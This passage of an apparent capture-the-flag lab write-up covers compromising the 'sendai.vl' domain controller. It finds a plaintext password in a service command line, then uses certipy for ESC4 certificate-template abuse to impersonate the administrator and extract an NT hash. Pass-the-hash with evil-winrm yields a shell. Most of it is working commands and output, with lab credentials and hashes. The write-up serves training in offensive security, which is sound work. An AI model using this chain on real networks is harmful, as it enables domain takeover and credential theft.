Dfs                                      C:\Windows\system32\dfssvc.exe  
DFSR                                     C:\Windows\system32\DFSRs.exe  
diagnosticshub.standardcollector.service C:\Windows\system32\DiagSvcs\DiagnosticsHub.StandardCollector.Service.exe  
DNS                                      C:\Windows\system32\dns.exe  
DsRoleSvc                                C:\Windows\System32\lsass.exe  
edgeupdate                               "C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe" /svc  
edgeupdatem                              "C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe" /medsvc  
EFS                                      C:\Windows\System32\lsass.exe  
FontCache3.0.0.0                         C:\Windows\Microsoft.Net\Framework64\v3.0\WPF\PresentationFontCache.exe  
IsmServ                                  C:\Windows\System32\ismserv.exe  
Kdc                                      C:\Windows\System32\lsass.exe  
KdsSvc                                   C:\Windows\system32\lsass.exe  
KeyIso                                   C:\Windows\system32\lsass.exe  
MicrosoftEdgeElevationService            "C:\Program Files (x86)\Microsoft\Edge\Application\139.0.3405.102\elevation_service.exe"  
MSDTC                                    C:\Windows\System32\msdtc.exe  
msiserver                                C:\Windows\system32\msiexec.exe /V  
MSSQL$SQLEXPRESS                         "C:\Program Files\Microsoft SQL Server\MSSQL15.SQLEXPRESS\MSSQL\Binn\sqlservr.exe" -sSQLEXPRESS  
Netlogon                                 C:\Windows\system32\lsass.exe  
NTDS                                     C:\Windows\System32\lsass.exe  
NtFrs                                    C:\Windows\system32\ntfrs.exe  
PerfHost                                 C:\Windows\SysWow64\perfhost.exe  
PsShutdownSvc                            C:\Windows\PSSDNSVC.EXE  
RpcLocator                               C:\Windows\system32\locator.exe  
RSoPProv                                 C:\Windows\system32\RSoPProv.exe  
SamSs                                    C:\Windows\system32\lsass.exe  
SecurityHealthService                    C:\Windows\system32\SecurityHealthService.exe  
Sense                                    "C:\Program Files\Windows Defender Advanced Threat Protection\MsSense.exe"  
SensorDataService                        C:\Windows\System32\SensorDataService.exe  
SNMPTRAP                                 C:\Windows\System32\snmptrap.exe  
Spooler                                  C:\Windows\System32\spoolsv.exe  
sppsvc                                   C:\Windows\system32\sppsvc.exe  
SQLAgent$SQLEXPRESS                      "C:\Program Files\Microsoft SQL Server\MSSQL15.SQLEXPRESS\MSSQL\Binn\SQLAGENT.EXE" -i  
                                        SQLEXPRESS  
SQLBrowser                               "C:\Program Files (x86)\Microsoft SQL Server\90\Shared\sqlbrowser.exe"  
SQLTELEMETRY$SQLEXPRESS                  "C:\Program Files\Microsoft SQL Server\MSSQL15.SQLEXPRESS\MSSQL\Binn\sqlceip.exe" -Service  
                                        SQLEXPRESS  
SQLWriter                                "C:\Program Files\Microsoft SQL Server\90\Shared\sqlwriter.exe"  
ssh-agent                                C:\Windows\System32\OpenSSH\ssh-agent.exe  
Support                                  C:\WINDOWS\helpdesk.exe -u clifford.davey -p RFmoB2WplgE_3p -k netsvcs  
TieringEngineService                     C:\Windows\system32\TieringEngineService.exe  
TrustedInstaller                         C:\Windows\servicing\TrustedInstaller.exe  
UevAgentService                          C:\Windows\system32\AgentService.exe  
VaultSvc                                 C:\Windows\system32\lsass.exe  
vds                                      C:\Windows\System32\vds.exe  
VGAuthService                            "C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"  
VM3DService                              "C:\Program Files\VMware\VMware Tools\vm3dservice.exe"  
VMTools                                  "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"  
vmvss                                    C:\Windows\system32\dllhost.exe /Processid:{05354908-93A6-4FE9-9A54-8367376F338A}  
VSS                                      C:\Windows\system32\vssvc.exe  
WdNisSvc                                 "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.23050.5-0\NisSrv.exe"  
WinDefend                                "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.23050.5-0\MsMpEng.exe"  
wmiApSrv                                 C:\Windows\system32\wbem\WmiApSrv.exe  
WMPNetworkSvc                            "C:\Program Files\Windows Media Player\wmpnetwk.exe"  
WSearch                                  C:\Windows\system32\SearchIndexer.exe /Embedding
```

And we got `C:\WINDOWS\helpdesk.exe -u clifford.davey -p RFmoB2WplgE_3p -k netsvcs`

```bash
>  certipy find -u 'clifford.davey' -p 'RFmoB2WplgE_3p' -dc-ip 10.129.234.66 -vulnerable -stdout  
Certipy v5.0.4 - by Oliver Lyak (ly4k)  
  
[*] Finding certificate templates  
[*] Found 34 certificate templates  
[*] Finding certificate authorities  
[*] Found 1 certificate authority  
[*] Found 12 enabled certificate templates  
[*] Finding issuance policies  
[*] Found 16 issuance policies  
[*] Found 0 OIDs linked to templates  
[*] Retrieving CA configuration for 'sendai-DC-CA' via RRP  
[!] Failed to connect to remote registry. Service should be starting now. Trying again...  
[*] Successfully retrieved CA configuration for 'sendai-DC-CA'  
[*] Checking web enrollment for CA 'sendai-DC-CA' @ 'dc.sendai.vl'  
[*] Enumeration output:  
Certificate Authorities  
 0  
   CA Name                             : sendai-DC-CA  
   DNS Name                            : dc.sendai.vl  
   Certificate Subject                 : CN=sendai-DC-CA, DC=sendai, DC=vl  
   Certificate Serial Number           : 326E51327366FC954831ECD5C04423BE  
   Certificate Validity Start          : 2023-07-11 09:19:29+00:00  
   Certificate Validity End            : 2123-07-11 09:29:29+00:00  
   Web Enrollment  
     HTTP  
       Enabled                         : False  
     HTTPS  
       Enabled                         : False  
   User Specified SAN                  : Disabled  
   Request Disposition                 : Issue  
   Enforce Encryption for Requests     : Enabled  
   Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy  
   Permissions  
     Owner                             : SENDAI.VL\Administrators  
     Access Rights  
       ManageCa                        : SENDAI.VL\Administrators  
                                         SENDAI.VL\Domain Admins  
                                         SENDAI.VL\Enterprise Admins  
       ManageCertificates              : SENDAI.VL\Administrators  
                                         SENDAI.VL\Domain Admins  
                                         SENDAI.VL\Enterprise Admins  
       Enroll                          : SENDAI.VL\Authenticated Users  
Certificate Templates  
 0  
   Template Name                       : SendaiComputer  
   Display Name                        : SendaiComputer  
   Certificate Authorities             : sendai-DC-CA  
   Enabled                             : True  
   Client Authentication               : True  
   Enrollment Agent                    : False  
   Any Purpose                         : False  
   Enrollee Supplies Subject           : False  
   Certificate Name Flag               : SubjectAltRequireDns  
   Enrollment Flag                     : AutoEnrollment  
   Extended Key Usage                  : Server Authentication  
                                         Client Authentication  
   Requires Manager Approval           : False  
   Requires Key Archival               : False  
   Authorized Signatures Required      : 0  
   Schema Version                      : 2  
   Validity Period                     : 100 years  
   Renewal Period                      : 6 weeks  
   Minimum RSA Key Length              : 4096  
   Template Created                    : 2023-07-11T12:46:12+00:00  
   Template Last Modified              : 2023-07-11T12:46:19+00:00  
   Permissions  
     Enrollment Permissions  
       Enrollment Rights               : SENDAI.VL\Domain Admins  
                                         SENDAI.VL\Domain Computers  
                                         SENDAI.VL\Enterprise Admins  
     Object Control Permissions  
       Owner                           : SENDAI.VL\Administrator  
       Full Control Principals         : SENDAI.VL\Domain Admins  
                                         SENDAI.VL\Enterprise Admins  
                                         SENDAI.VL\ca-operators  
       Write Owner Principals          : SENDAI.VL\Domain Admins  
                                         SENDAI.VL\Enterprise Admins  
                                         SENDAI.VL\ca-operators  
       Write Dacl Principals           : SENDAI.VL\Domain Admins  
                                         SENDAI.VL\Enterprise Admins  
                                         SENDAI.VL\ca-operators  
       Write Property Enroll           : SENDAI.VL\Domain Admins  
                                         SENDAI.VL\Domain Computers  
                                         SENDAI.VL\Enterprise Admins  
   [+] User Enrollable Principals      : SENDAI.VL\Domain Computers  
                                         SENDAI.VL\ca-operators  
   [+] User ACL Principals             : SENDAI.VL\ca-operators  
   [!] Vulnerabilities  
     ESC4                              : User has dangerous permissions.
```

```bash
>  nxc winrm 10.129.234.66 -u 'clifford.davey' -p 'RFmoB2WplgE_3p'  
WINRM       10.129.234.66   5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:sendai.vl)    
WINRM       10.129.234.66   5985   DC               [-] sendai.vl\clifford.davey:RFmoB2WplgE_3p
```

So we cannot get a shell with this user, but we need to find a way to abuse his permissions.

```bash
>  nxc smb 10.129.234.66 -u 'clifford.davey' -p 'RFmoB2WplgE_3p' --shares  
SMB         10.129.234.66   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:None) (Null Auth:True)  
SMB         10.129.234.66   445    DC               [+] sendai.vl\clifford.davey:RFmoB2WplgE_3p    
SMB         10.129.234.66   445    DC               [*] Enumerated shares  
SMB         10.129.234.66   445    DC               Share           Permissions     Remark  
SMB         10.129.234.66   445    DC               -----           -----------     ------  
SMB         10.129.234.66   445    DC               ADMIN$                          Remote Admin  
SMB         10.129.234.66   445    DC               C$                              Default share  
SMB         10.129.234.66   445    DC               config          READ,WRITE         
SMB         10.129.234.66   445    DC               IPC$            READ            Remote IPC  
SMB         10.129.234.66   445    DC               NETLOGON        READ            Logon server share    
SMB         10.129.234.66   445    DC               sendai          READ,WRITE      company share  
SMB         10.129.234.66   445    DC               SYSVOL          READ            Logon server share    
SMB         10.129.234.66   445    DC               Users           READ
```

So he doesn't have any READ or WRITE privileges above the previous users on SMB.

We'll try to request a certificate with `¢ertipy` from the administrator :

```bash
>  certipy req -u 'clifford.davey' -p 'RFmoB2WplgE_3p' -dc-ip 10.129.234.66 -target dc.sendai.vl -ca 'sendai-DC-CA' -template SendaiComputer -upn administrator@sendai.vl  
Certipy v5.0.4 - by Oliver Lyak (ly4k)  
  
[*] Requesting certificate via RPC  
[*] Request ID is 6  
[-] Got error while requesting certificate: code: 0x8009480f - CERTSRV_E_SUBJECT_DNS_REQUIRED - The Domain Name System (DNS) name is unavailable and cannot be added to the Subject Alternate name.  
Would you like to save the private key? (y/N): y  
[*] Saving private key to '6.key'  
[*] Wrote private key to '6.key'  
[-] Failed to request certificate  
```

We'll verify the administrator SID :

```bash
>  lookupsid.py 'sendai.vl/clifford.davey:RFmoB2WplgE_3p@10.129.234.66' | rg -i administrator  
  
500: SENDAI\Administrator (SidTypeUser)
```

We fix `SendaiComputer` :

```bash
>  certipy template -u 'clifford.davey' -p 'RFmoB2WplgE_3p' -dc-ip 10.129.234.66 -template SendaiComputer -write-default-configuration -force  
  
Certipy v5.0.4 - by Oliver Lyak (ly4k)  
  
[*] Saving current configuration to 'SendaiComputer.json'  
[*] Wrote current configuration for 'SendaiComputer' to 'SendaiComputer.json'  
[*] Updating certificate template 'SendaiComputer'  
[*] Replacing:  
[*]     nTSecurityDescriptor: b'\x01\x00\x04\x9c0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x14\x00\x00\x00\x02\x00\x1c\x00\x01\x00\x00\x00\x00\x00\x14\x00\xff\x01\x0f\x00\x01\x01\x00\x00\x00\x00\x00\x05\x0b\  
x00\x00\x00\x01\x01\x00\x00\x00\x00\x00\x05\x0b\x00\x00\x00'  
[*]     flags: 66104  
[*]     pKIDefaultKeySpec: 2  
[*]     pKIKeyUsage: b'\x86\x00'  
[*]     pKIMaxIssuingDepth: -1  
[*]     pKICriticalExtensions: ['2.5.29.19', '2.5.29.15']  
[*]     pKIExpirationPeriod: b'\x00@9\x87.\xe1\xfe\xff'  
[*]     pKIExtendedKeyUsage: ['1.3.6.1.5.5.7.3.2']  
[*]     pKIDefaultCSPs: ['2,Microsoft Base Cryptographic Provider v1.0', '1,Microsoft Enhanced Cryptographic Provider v1.0']  
[*]     msPKI-Enrollment-Flag: 0  
[*]     msPKI-Private-Key-Flag: 16  
[*]     msPKI-Certificate-Name-Flag: 1  
[*]     msPKI-Minimal-Key-Size: 2048  
[*]     msPKI-Certificate-Application-Policy: ['1.3.6.1.5.5.7.3.2']  
[*] Successfully updated 'SendaiComputer'
```

Then we print the full Domain SID :

```bash
>  lookupsid.py 'sendai.vl/clifford.davey:RFmoB2WplgE_3p@10.129.234.66' 2>&1 | rg -i 'Domain SID|Administrator'  
  
[*] Domain SID is: S-1-5-21-3085872742-570972823-736764132  
500: SENDAI\Administrator (SidTypeUser)
```

With that, we got the full SID for Administrator : `S-1-5-21-3085872742-570972823-736764132-500` which should allow us to request a certificate.

```bash
>  certipy req -u 'clifford.davey' -p 'RFmoB2WplgE_3p' -dc-ip 10.129.234.66 -target dc.sendai.vl -ca 'sendai-DC-CA' -template SendaiComputer -upn administrator@sendai.vl -sid '`S-1-5-21-3085872742-570972823-736  
764132-500' -dns dc.sendai.vl  
  
Certipy v5.0.4 - by Oliver Lyak (ly4k)  
  
[*] Requesting certificate via RPC  
[*] Request ID is 14  
[*] Successfully requested certificate  
[*] Got certificate with multiple identities  
   UPN: 'administrator@sendai.vl'  
   DNS Host Name: 'dc.sendai.vl'  
[!] Conflicting SIDs found in certificate:  
[!]     SAN URL:            '%60S-1-5-21-3085872742-570972823-736764132-500'  
[!]     Security Extension: 'S-1-5-21-3085872742-570972823-736764132-500'  
[!] Windows will use the security extension SID for authentication purposes  
[*] Certificate object SID is 'S-1-5-21-3085872742-570972823-736764132-500'  
[*] Saving certificate and private key to 'administrator_dc.pfx'  
[*] Wrote certificate and private key to 'administrator_dc.pfx'

>  certipy auth -pfx administrator_dc.pfx -username administrator -domain sendai.vl -dc-ip 10.129.234.66 -ns 10.129.234.66  
Certipy v5.0.4 - by Oliver Lyak (ly4k)  
  
[*] Certificate identities:  
[*]     SAN UPN: 'administrator@sendai.vl'  
[*]     SAN DNS Host Name: 'dc.sendai.vl'  
[*]     SAN URL SID: '%60S-1-5-21-3085872742-570972823-736764132-500'  
[*]     Security Extension SID: 'S-1-5-21-3085872742-570972823-736764132-500'  
[!] Conflicting SIDs found in certificate:  
[!]     SAN URL:            '%60S-1-5-21-3085872742-570972823-736764132-500'  
[!]     Security Extension: 'S-1-5-21-3085872742-570972823-736764132-500'  
[!] Windows will use the security extension SID for authentication purposes  
[*] Found multiple identities in certificate  
[*] Using identity: UPN: administrator@sendai.vl  
[*] Using principal: 'administrator@sendai.vl'  
[*] Trying to get TGT...  
[-] Got error while trying to request TGT: Kerberos SessionError: KRB_ERR_GENERIC(Generic error (description in e-text))  
[-] Use -debug to print a stacktrace  
[-] See the wiki for more information
```

This failed because I put ` in front of the SID while creating the certificate.
I'll do a clean one.

```bash
>  certipy req -u 'clifford.davey' -p 'RFmoB2WplgE_3p' -dc-ip 10.129.234.66 -target dc.sendai.vl -ca 'sendai-DC-CA' -template SendaiComputer -upn administrator@sendai.vl -sid 'S-1-5-21-3085872742-570972823-7367  
64132-500' -dns dc.sendai.vl -out administrator  
  
Certipy v5.0.4 - by Oliver Lyak (ly4k)  
  
[*] Requesting certificate via RPC  
[*] Request ID is 16  
[*] Successfully requested certificate  
[*] Got certificate with multiple identities  
   UPN: 'administrator@sendai.vl'  
   DNS Host Name: 'dc.sendai.vl'  
[*] Certificate object SID is 'S-1-5-21-3085872742-570972823-736764132-500'  
[*] Saving certificate and private key to 'administrator.pfx'  
[*] Wrote certificate and private key to 'administrator.pfx'

>  certipy auth -pfx administrator.pfx -username administrator -domain sendai.vl -dc-ip 10.129.234.66 -ns 10.129.234.66  
Certipy v5.0.4 - by Oliver Lyak (ly4k)  
  
[*] Certificate identities:  
[*]     SAN UPN: 'administrator@sendai.vl'  
[*]     SAN DNS Host Name: 'dc.sendai.vl'  
[*]     SAN URL SID: 'S-1-5-21-3085872742-570972823-736764132-500'  
[*]     Security Extension SID: 'S-1-5-21-3085872742-570972823-736764132-500'  
[*] Found multiple identities in certificate  
[*] Using identity: UPN: administrator@sendai.vl  
[*] Using principal: 'administrator@sendai.vl'  
[*] Trying to get TGT...  
[*] Got TGT  
[*] Saving credential cache to 'administrator.ccache'  
[*] Wrote credential cache to 'administrator.ccache'  
[*] Trying to retrieve NT hash for 'administrator'  
[*] Got hash for 'administrator@sendai.vl': aad3b435b51404eeaad3b435b51404ee:cfb106feec8b89a3d98e14dcbe8d087a
```

And we got the hash !

```PowerShell
>  nxc winrm 10.129.234.66 -u administrator -H aad3b435b51404eeaad3b435b51404ee:cfb106feec8b89a3d98e14dcbe8d087a  
  
WINRM       10.129.234.66   5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:sendai.vl)    
WINRM       10.129.234.66   5985   DC               [+] sendai.vl\administrator:cfb106feec8b89a3d98e14dcbe8d087a (Pwn3d!)  
>  evil-winrm -i 10.129.234.66 -u administrator -H aad3b435b51404eeaad3b435b51404ee:cfb106feec8b89a3d98e14dcbe8d087a  
  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/fragment.rb:35: warning: redefining 'object_id' may cause serious problems  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/message_fragmenter.rb:29: warning: redefining 'object_id' may cause serious problems  
/usr/lib/ruby/3.4.0/readline.rb:4: warning: reline was loaded from the standard library, but will no longer be part of the default gems starting from Ruby 4.0.0.  
You can add reline to your Gemfile or gemspec to silence this warning.  
                                          
Evil-WinRM shell v3.9  
                                          
Error: Invalid hash format
```

For some reason, the hash format is 'invalid'. 

I try again : 

```PowerShell
>  evil-winrm -i 10.129.234.66 -u administrator -H 'aad3b435b51404eeaad3b435b51404ee:cfb106feec8b89a3d98e14dcbe8d087a'  
  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/fragment.rb:35: warning: redefining 'object_id' may cause serious problems  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/message_fragmenter.rb:29: warning: redefining 'object_id' may cause serious problems  
/usr/lib/ruby/3.4.0/readline.rb:4: warning: reline was loaded from the standard library, but will no longer be part of the default gems starting from Ruby 4.0.0.  
You can add reline to your Gemfile or gemspec to silence this warning.  
                                          
Evil-WinRM shell v3.9  
                                          
Error: Invalid hash format  
>  evil-winrm -i dc.sendai.vl -u administrator -H 'aad3b435b51404eeaad3b435b51404ee:cfb106feec8b89a3d98e14dcbe8d087a'  
  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/fragment.rb:35: warning: redefining 'object_id' may cause serious problems  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/message_fragmenter.rb:29: warning: redefining 'object_id' may cause serious problems  
/usr/lib/ruby/3.4.0/readline.rb:4: warning: reline was loaded from the standard library, but will no longer be part of the default gems starting from Ruby 4.0.0.  
You can add reline to your Gemfile or gemspec to silence this warning.  
                                          
Evil-WinRM shell v3.9  
                                          
Error: Invalid hash format
```

I got it now. We got an NTLM hash (confirmed by nxc to be the right one) but to connect to the shell, we only need the NT part : the hash is divided in two parts : `aad3b435b51404eeaad3b435b51404ee` and `cfb106feec8b89a3d98e14dcbe8d087a`, separated by a : which means the NTLM hash can be divided into the NT (the latter part) and LM (the former part) `LM:NT`. The first part of this NTLM hash is a dummy value because LM is disabled. Usually, the NT hash is the one we would be looking for to authenticate via Pass-The-Hash :

```PowerShell
>  evil-winrm -i dc.sendai.vl -u administrator -H 'cfb106feec8b89a3d98e14dcbe8d087a'  
  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/fragment.rb:35: warning: redefining 'object_id' may cause serious problems  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/message_fragmenter.rb:29: warning: redefining 'object_id' may cause serious problems  
/usr/lib/ruby/3.4.0/readline.rb:4: warning: reline was loaded from the standard library, but will no longer be part of the default gems starting from Ruby 4.0.0.  
You can add reline to your Gemfile or gemspec to silence this warning.  
                                          
Evil-WinRM shell v3.9  
                                          
Warning: Remote path completions is disabled due to ruby limitation: undefined method 'quoting_detection_proc' for module Reline  
                                          
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion  
                                          
Info: Establishing connection to remote endpoint  
*Evil-WinRM* PS C:\Users\Administrator\Documents> dir  
  
  
   Directory: C:\Users\Administrator\Documents  
  
  
Mode                 LastWriteTime         Length Name  
----                 -------------         ------ ----  
d-----         7/11/2023   2:48 AM                Visual Studio 2017  
  
  
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd /  
*Evil-WinRM* PS C:\> dir  
  
  
   Directory: C:\  
  
  
Mode                 LastWriteTime         Length Name  
----                 -------------         ------ ----  
d-----         5/26/2026   4:35 AM                config  
d-----         4/15/2025   8:20 PM                inetpub  
d-----          5/8/2021   1:20 AM                PerfLogs  
d-r---         4/15/2025   7:51 PM                Program Files  
d-----         7/18/2023   6:11 AM                Program Files (x86)  
d-----         5/26/2026   4:35 AM                sendai  
d-----         7/11/2023   2:35 AM                SQL2019  
d-r---         5/26/2026   4:10 AM                Users  
d-----         8/18/2025   5:04 AM                Windows  
-a----         4/15/2025   8:27 PM             32 user.txt  
  
  
*Evil-WinRM* PS C:\> cd /Users/Administrator/Desktop  
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir  
  
  
   Directory: C:\Users\Administrator\Desktop  
  
  
Mode                 LastWriteTime         Length Name  
----                 -------------         ------ ----  
-a----         4/15/2025   8:27 PM             32 root.txt  
  
  
*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt  
1bc******************91cf
```

And we got root !

```PowerShell
*Evil-WinRM* PS C:\Users\Administrator\Desktop> systeminfo  
  
Host Name:                 DC  
OS Name:                   Microsoft Windows Server 2022 Standard  
OS Version:                10.0.20348 N/A Build 20348  
OS Manufacturer:           Microsoft Corporation  
OS Configuration:          Primary Domain Controller  
OS Build Type:             Multiprocessor Free  
Registered Owner:          Windows User  
Registered Organization:  
Product ID:                00454-20165-01481-AA872  
Original Install Date:     7/11/2023, 12:36:49 AM  
System Boot Time:          5/25/2026, 11:32:41 PM  
System Manufacturer:       VMware, Inc.  
System Model:              VMware20,1  
System Type:               x64-based PC  
Processor(s):              1 Processor(s) Installed.  
                          [01]: AMD64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2595 Mhz  
BIOS Version:              VMware, Inc. VMW201.00V.24504846.B64.2501180339, 1/18/2025  
Windows Directory:         C:\Windows  
System Directory:          C:\Windows\system32  
Boot Device:               \Device\HarddiskVolume2  
System Locale:             en-us;English (United States)  
Input Locale:              en-us;English (United States)  
Time Zone:                 (UTC-08:00) Pacific Time (US & Canada)  
Total Physical Memory:     4,095 MB  
Available Physical Memory: 2,591 MB  
Virtual Memory: Max Size:  5,503 MB  
Virtual Memory: Available: 3,838 MB  
Virtual Memory: In Use:    1,665 MB  
Page File Location(s):     C:\pagefile.sys  
Domain:                    sendai.vl  
Logon Server:              N/A  
Hotfix(s):                 N/A  
Network Card(s):           1 NIC(s) Installed.  
                          [01]: vmxnet3 Ethernet Adapter  
                                Connection Name: Ethernet0 2  
                                DHCP Enabled:    Yes  
                                DHCP Server:     10.10.10.2  
                                IP address(es)  
                                [01]: 10.129.234.66  
                                [02]: fe80::1630:1951:2452:c8ef  
                                [03]: dead:beef::a5b7:9775:1ca4:7fa6  
                                [04]: dead:beef::1ee  
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
```

The `systeminfo` tells us this runs on Windows Server 2022, where the LM hash must be depreciated.
